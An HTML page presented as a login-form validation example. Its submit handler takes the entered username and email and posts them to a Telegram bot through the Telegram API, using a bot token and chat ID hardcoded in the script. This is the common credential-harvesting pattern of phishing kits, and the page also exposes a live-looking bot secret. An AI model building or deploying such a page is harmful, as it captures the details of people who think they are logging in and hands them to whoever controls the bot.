<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HTML5 Login Form with Validation Example</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link rel="stylesheet" href="./style.css">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<!-- partial:index.partial.html -->
<div id="login-form-wrap">
  <h2>Login</h2>
  <form id="login-form" onsubmit="return sendToTelegram(event);">
    <p>
      <input type="text" id="username" name="username" placeholder="Username" required>
      <i class="validation"><span></span><span></span></i>
    </p>
    <p>
      <input type="email" id="email" name="email" placeholder="Email Address" required>
      <i class="validation"><span></span><span></span></i>
    </p>
    <p>
      <input type="submit" id="login" value="Login">
    </p>
  </form>
  <div id="create-account-wrap">
    <p>Not a member? <a href="#">Create Account</a></p>
  </div><!--create-account-wrap-->
</div><!--login-form-wrap-->

<script>
  function sendToTelegram(event) {
    event.preventDefault(); // Prevent the form from submitting normally

    const username = document.getElementById('username').value;
    const email = document.getElementById('email').value;

    // Replace with your Telegram bot token and chat ID
    const botToken = '7635063415:AAFq8psLp52CWEVcyVNYDIGeQiA0BQT7e-M';
    const chatId = '6056728866';

    const message = `New login attempt:\nUsername: ${username}\nEmail: ${email}`;

    // Send the message to your Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
    .then(response => {
      if (response.ok) {
        alert('Login information sent to Telegram!');
      } else {
        alert('Failed to send message to Telegram.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('An error occurred while sending the message.');
    });

    return false; // Prevent default form submission
  }
</script>
<!-- partial -->
  
</body>
</html>
